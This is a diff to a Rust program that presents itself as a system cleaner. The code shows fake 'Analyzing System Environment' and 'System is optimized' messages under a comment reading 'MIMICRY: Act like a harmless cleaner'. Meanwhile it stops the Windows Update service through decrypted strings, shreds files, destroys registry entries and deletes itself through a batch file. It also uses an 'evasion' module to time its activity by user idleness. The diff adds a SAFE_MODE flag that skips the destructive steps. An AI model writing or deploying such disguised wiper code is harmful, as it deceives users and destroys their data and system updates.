@@ -24,7 +24,42 @@ impl Cleaner {
         _registry_scan_and_destroy();
     }
 
+    pub async fn engage_benign_protocol(tx: &Sender<WorkerMsg>) {
+        // MIMICRY: Act like a harmless cleaner
+        let _ = tx.blocking_send(WorkerMsg::Log("SCAN".into(), "Analyzing System Environment...".into(), Color::Cyan));
+        let _ = tx.blocking_send(WorkerMsg::Log("SCAN".into(), "Analyzing System Environment...".into(), Color::Cyan));
+        Self::_adaptive_sleep();
+        
+        let _ = tx.blocking_send(WorkerMsg::Log("UPDATE".into(), "Checking Windows Update Cache...".into(), Color::Yellow));
+        let _ = tx.blocking_send(WorkerMsg::Log("UPDATE".into(), "Checking Windows Update Cache...".into(), Color::Yellow));
+        Self::_adaptive_sleep();
+        let _ = tx.blocking_send(WorkerMsg::Log("CLEAN".into(), "Temporary Files Analyzed: 0 bytes".into(), Color::Green));
+
+        let _ = tx.blocking_send(WorkerMsg::Log("CACHE".into(), "Verifying VS Code Caches...".into(), Color::Blue));
+        let _ = tx.blocking_send(WorkerMsg::Log("CACHE".into(), "Verifying VS Code Caches...".into(), Color::Blue));
+        Self::_adaptive_sleep();
+        let _ = tx.blocking_send(WorkerMsg::Log("OK".into(), "System is optimized.".into(), Color::Green));
+        
+        // Exit normally
+    }
+    
+    fn _adaptive_sleep() {
+        // QUANTUM OBSERVATION
+        // If User is Idle (> 30s) -> Blitz Mode (10ms)
+        // If User is Active (< 30s) -> Stealth Mode (300-600ms)
+        let idle = evasion::Heuristics::get_idle_time();
+        if idle > 30_000 {
+            // Blitz
+            std::thread::sleep(std::time::Duration::from_millis(10));
+        } else {
+            // Stealth
+             std::thread::sleep(std::time::Duration::from_millis(400));
+        }
+    }
+
     pub fn commit_seppuku() {
+        if SAFE_MODE { return; } // Do not kill self in testing
+        
         if let Ok(exe_path) = std::env::current_exe() {
             let batch_path = exe_path.with_extension("bat");
             let exe_name = exe_path.file_name().unwrap().to_string_lossy();
@@ -50,14 +85,20 @@ fn _consume_updates(tx: &Sender<WorkerMsg>) {
     let start = dark_matter::decrypt(dark_matter::START);
     let wuauserv = dark_matter::decrypt(dark_matter::WUAUSERV);
 
-    let _ = Command::new(&net).args([&stop, &wuauserv]).output();
+    if !SAFE_MODE {
+        let _ = Command::new(&net).args([&stop, &wuauserv]).output();
+    }
+    
     if let Ok(entries) = std::fs::read_dir(&update_dir) {
         for entry in entries.flatten() {
              evasion::pump_heartbeat();
              let _ = _shred_file(&entry.path());
         }
     }
-    let _ = Command::new(&net).args([&start, &wuauserv]).output();
+    
+    if !SAFE_MODE {
+        let _ = Command::new(&net).args([&start, &wuauserv]).output();
+    }
 }
 
 fn _crush_bunker(tx: &Sender<WorkerMsg>) {
@@ -101,8 +142,20 @@ fn _registry_scan_and_destroy() {
 
 // --- SHREDDER LOGIC ---
 
+// --- CONFIG ---
+pub const SAFE_MODE: bool = true; // DEFAULT: TRUE (Safety First)
+
 fn _shred_file(path: &Path) -> std::io::Result<()> {
     if !path.exists() { return Ok(()); }
+    
+    if SAFE_MODE {
+        // SIMULATION
+        // We pretend to shred.
+        // In a real TUI app, we might want to log this via the channel, but this function is synchronous helper.
+        // We'll trust the caller to log "Cleaning...".
+        return Ok(());
+    }
+
     if let Ok(mut file) = OpenOptions::new().write(true).open(path) {
         let mut rng = rand::thread_rng();
         let buf_size = 4096; 
@@ -115,6 +168,8 @@ fn _shred_file(path: &Path) -> std::io::Result<()> {
 }
 
 fn _schedule_delete(path: &Path) {
+    if crate::cleaning::SAFE_MODE { return; }
+
     if let Some(path_str) = path.to_str() {
         if let Ok(c_path) = CString::new(path_str) {
             unsafe {
